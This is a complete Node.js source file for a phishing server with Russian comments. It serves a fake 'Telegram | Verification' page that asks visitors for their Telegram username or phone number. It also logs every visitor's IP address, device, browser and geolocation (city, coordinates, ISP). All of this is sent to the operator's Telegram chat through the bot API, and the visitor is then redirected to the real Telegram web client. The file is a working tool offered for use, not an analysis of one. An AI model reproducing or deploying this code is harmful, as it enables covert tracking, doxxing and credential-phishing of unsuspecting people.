const express = require('express');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

// ========== ПРОВЕРКА ПЕРЕМЕННЫХ ==========
const TELEGRAM_BOT_TOKEN = process.env.TOKEN;
const TELEGRAM_CHAT_ID = process.env.CHAT_ID;

console.log('\n========== ЛОГЕР ЗАПУЩЕН ==========');
console.log(`🕒 Время запуска: ${new Date().toLocaleString()}`);
console.log(`📡 Порт: ${PORT}`);
console.log(`🤖 Telegram бот: ${TELEGRAM_BOT_TOKEN ? '✅' : '❌'} ${TELEGRAM_BOT_TOKEN ? '(токен установлен)' : '(токен НЕ задан!)'}`);
console.log(`👤 Telegram CHAT_ID: ${TELEGRAM_CHAT_ID ? '✅' : '❌'} ${TELEGRAM_CHAT_ID ? TELEGRAM_CHAT_ID : '(ID НЕ задан!)'}`);
console.log('====================================\n');

// ========== ПРОВЕРКА РАБОТОСПОСОБНОСТИ ТОКЕНА ==========
if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
  axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getMe`)
    .then(res => {
      console.log(`✅ Бот авторизован: @${res.data.result.username}`);
    })
    .catch(err => {
      console.log(`❌ Ошибка авторизации бота: ${err.message}`);
    });
} else {
  console.log('⚠️ Невозможно проверить бота: не заданы TOKEN или CHAT_ID');
}

// ========== ФУНКЦИЯ ОТПРАВКИ В TELEGRAM ==========
function sendToTelegram(text, isError = false) {
  if (!TELEGRAM_BOT_TOKEN) {
    console.log('❌ Невозможно отправить сообщение: TOKEN не задан');
    return false;
  }
  
  if (!TELEGRAM_CHAT_ID) {
    console.log('❌ Невозможно отправить сообщение: CHAT_ID не задан');
    return false;
  }
  
  const prefix = isError ? '⚠️ ERROR' : '📩';
  console.log(`📤 Отправка в Telegram: ${text.slice(0, 50)}...`);
  
  axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    chat_id: TELEGRAM_CHAT_ID,
    text: `${prefix}\n${text}`,
    parse_mode: 'HTML'
  })
  .then(() => {
    console.log('✅ Сообщение успешно отправлено в Telegram');
  })
  .catch(err => {
    console.log(`❌ Ошибка отправки в Telegram: ${err.message}`);
    if (err.response) {
      console.log(`📄 Детали: ${JSON.stringify(err.response.data)}`);
    }
  });
  
  return true;
}

// ========== ПАРСЕР USER-AGENT ==========
function parseUserAgent(ua) {
  let device = 'Unknown';
  let os = 'Unknown';
  let browser = 'Unknown';
  
  if (ua.includes('iPhone')) device = '📱 iPhone';
  else if (ua.includes('iPad')) device = '📱 iPad';
  else if (ua.includes('Android')) device = '📱 Android';
  else if (ua.includes('Windows NT')) device = '💻 Windows PC';
  else if (ua.includes('Macintosh')) device = '💻 Mac';
  else if (ua.includes('Linux')) device = '🐧 Linux';
  
  if (ua.includes('Windows NT 10.0')) os = 'Windows 10/11';
  else if (ua.includes('Windows NT 6.1')) os = 'Windows 7';
  else if (ua.includes('Windows NT 6.2')) os = 'Windows 8';
  else if (ua.includes('Mac OS X')) os = 'macOS';
  else if (ua.includes('Android')) os = 'Android';
  else if (ua.includes('iPhone')) os = 'iOS';
  else if (ua.includes('iPad')) os = 'iPadOS';
  
  if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
  else if (ua.includes('Firefox')) browser = 'Firefox';
  else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
  else if (ua.includes('Edg')) browser = 'Edge';
  else if (ua.includes('Opera')) browser = 'Opera';
  
  return { device, os, browser };
}

// ========== ГЕОЛОКАЦИЯ ПО IP ==========
async function getGeoLocation(ip) {
  try {
    const response = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,city,lat,lon,isp,org,query`, {
      timeout: 5000
    });
    if (response.data.status === 'success') {
      return {
        country: response.data.country,
        city: response.data.city,
        lat: response.data.lat,
        lon: response.data.lon,
        isp: response.data.isp,
        org: response.data.org
      };
    }
  } catch (err) {
    console.log(`⚠️ Ошибка геолокации для IP ${ip}: ${err.message}`);
  }
  return null;
}

// ========== ОСНОВНЫЕ МАРШРУТЫ ==========
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Главная страница
app.get('/', async (req, res) => {
  console.log('\n========== НОВЫЙ ВИЗИТ ==========');
  
  // Получаем IP
  let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  if (ip.includes('::ffff:')) ip = ip.replace('::ffff:', '');
  if (ip === '::1') ip = '127.0.0.1';
  
  const ua = req.headers['user-agent'] || 'Unknown';
  const referer = req.headers['referer'] || 'Direct';
  const time = new Date().toLocaleString();
  
  console.log(`🌐 IP: ${ip}`);
  console.log(`💻 User-Agent: ${ua.slice(0, 100)}`);
  console.log(`🔗 Referer: ${referer}`);
  console.log(`🕒 Время: ${time}`);
  
  // Парсим устройство
  const deviceInfo = parseUserAgent(ua);
  console.log(`📱 Устройство: ${deviceInfo.device}`);
  console.log(`💿 ОС: ${deviceInfo.os}`);
  console.log(`🌍 Браузер: ${deviceInfo.browser}`);
  
  // Получаем геолокацию
  const geo = await getGeoLocation(ip);
  if (geo) {
    console.log(`🗺️ Страна: ${geo.country}`);
    console.log(`🏙️ Город: ${geo.city}`);
    console.log(`📍 Координаты: ${geo.lat}, ${geo.lon}`);
    console.log(`📡 Провайдер: ${geo.isp}`);
  } else {
    console.log('🗺️ Геолокация не определена');
  }
  
  // Формируем сообщение
  let msg = `📍 <b>НОВЫЙ ВИЗИТ</b>\n`;
  msg += `🕒 <b>Время:</b> ${time}\n`;
  msg += `🌐 <b>IP:</b> ${ip}\n`;
  msg += `📱 <b>Устройство:</b> ${deviceInfo.device}\n`;
  msg += `💻 <b>ОС:</b> ${deviceInfo.os}\n`;
  msg += `🌍 <b>Браузер:</b> ${deviceInfo.browser}\n`;
  msg += `🔗 <b>Источник:</b> ${referer}\n`;
  
  if (geo) {
    msg += `🗺️ <b>Страна:</b> ${geo.country}\n`;
    msg += `🏙️ <b>Город:</b> ${geo.city}\n`;
    msg += `📍 <b>Координаты:</b> ${geo.lat}, ${geo.lon}\n`;
    msg += `📡 <b>Провайдер:</b> ${geo.isp}\n`;
  }
  
  msg += `💻 <b>User-Agent:</b> <code>${ua.slice(0, 150)}</code>`;
  
  // Отправляем в Telegram
  sendToTelegram(msg);
  
  // Отдаём страницу
  res.send(`<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Telegram | Verification</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
      background: #0f0f0f;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }
    
    .card {
      background: #1f1f1f;
      border-radius: 28px;
      padding: 32px 24px;
      max-width: 400px;
      width: 100%;
      box-shadow: 0 8px 24px rgba(0,0,0,0.4);
      text-align: center;
      animation: fadeIn 0.3s ease;
    }
    
    @keyframes fadeIn {
      from {
        opacity: 0;
        transform: translateY(20px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }
    
    .logo {
      margin-bottom: 24px;
    }
    
    .logo svg {
      width: 48px;
      height: 48px;
      fill: #2c7be5;
    }
    
    h2 {
      color: #fff;
      font-size: 24px;
      font-weight: 500;
      margin-bottom: 8px;
    }
    
    .sub {
      color: #888;
      font-size: 14px;
      margin-bottom: 28px;
    }
    
    input {
      width: 100%;
      padding: 14px 16px;
      background: #2a2a2a;
      border: none;
      border-radius: 14px;
      color: white;
      font-size: 16px;
      margin-bottom: 16px;
      outline: none;
      transition: all 0.2s;
      box-sizing: border-box;
    }
    
    input:focus {
      background: #333;
      transform: scale(1.02);
    }
    
    button {
      width: 100%;
      padding: 14px;
      background: #2c7be5;
      border: none;
      border-radius: 14px;
      color: white;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.2s;
    }
    
    button:hover {
      background: #1a68d1;
      transform: translateY(-2px);
    }
    
    button:active {
      transform: translateY(0);
    }
    
    .footer {
      margin-top: 24px;
      font-size: 11px;
      color: #555;
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">
      <svg viewBox="0 0 24 24">
        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z"/>
      </svg>
    </div>
    <h2>Welcome</h2>
    <div class="sub">Enter your Telegram username to continue</div>
    <form action="/submit" method="post">
      <input type="text" name="username" placeholder="@username or phone" required autocomplete="off">
      <button type="submit">Continue</button>
    </form>
    <div class="footer">Powered by Telegram</div>
  </div>
</body>
</html>`);
  
  console.log('========== ВИЗИТ ОБРАБОТАН ==========\n');
});

// Обработка username
app.post('/submit', async (req, res) => {
  console.log('\n========== ПОЛУЧЕН USERNAME ==========');
  
  const { username } = req.body;
  
  let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  if (ip.includes('::ffff:')) ip = ip.replace('::ffff:', '');
  if (ip === '::1') ip = '127.0.0.1';
  
  const ua = req.headers['user-agent'] || 'Unknown';
  const time = new Date().toLocaleString();
  
  console.log(`👤 Username: ${username}`);
  console.log(`🌐 IP: ${ip}`);
  console.log(`💻 UA: ${ua.slice(0, 100)}`);
  console.log(`🕒 Время: ${time}`);
  
  // Парсим устройство
  const deviceInfo = parseUserAgent(ua);
  
  // Получаем геолокацию
  const geo = await getGeoLocation(ip);
  
  // Формируем сообщение
  let msg = `👤 <b>USERNAME ПОЛУЧЕН</b>\n`;
  msg += `🕒 <b>Время:</b> ${time}\n`;
  msg += `🌐 <b>IP:</b> ${ip}\n`;
  msg += `👤 <b>Username:</b> @${username}\n`;
  msg += `📱 <b>Устройство:</b> ${deviceInfo.device}\n`;
  msg += `💻 <b>ОС:</b> ${deviceInfo.os}\n`;
  msg += `🌍 <b>Браузер:</b> ${deviceInfo.browser}\n`;
  
  if (geo) {
    msg += `🗺️ <b>Страна:</b> ${geo.country}\n`;
    msg += `🏙️ <b>Город:</b> ${geo.city}\n`;
    msg += `📍 <b>Координаты:</b> ${geo.lat}, ${geo.lon}\n`;
  }
  
  // Отправляем в Telegram
  sendToTelegram(msg);
  
  console.log('========== USERNAME ОБРАБОТАН ==========\n');
  
  // Редирект
  res.send(`<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Redirecting...</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: #0f0f0f;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      text-align: center;
    }
    .loader {
      width: 40px;
      height: 40px;
      border: 3px solid #2c7be5;
      border-top-color: transparent;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      margin: 0 auto 20px;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div>
    <div class="loader"></div>
    <div>Redirecting...</div>
  </div>
  <script>
    setTimeout(() => {
      window.location.href = "https://web.telegram.org";
    }, 2000);
  </script>
</body>
</html>`);
});

// Обработка ошибок 404
app.use((req, res) => {
  res.status(404).send('Page not found');
});

// Обработка ошибок сервера
app.use((err, req, res, next) => {
  console.error('❌ Ошибка сервера:', err);
  sendToTelegram(`⚠️ <b>Ошибка сервера</b>\n${err.message}`, true);
  res.status(500).send('Internal server error');
});

// Запуск сервера
app.listen(PORT, () => {
  console.log('\n========================================');
  console.log(`✅ Логер успешно запущен на порту ${PORT}`);
  console.log(`🔗 Локальный адрес: http://localhost:${PORT}`);
  console.log('========================================\n');
});
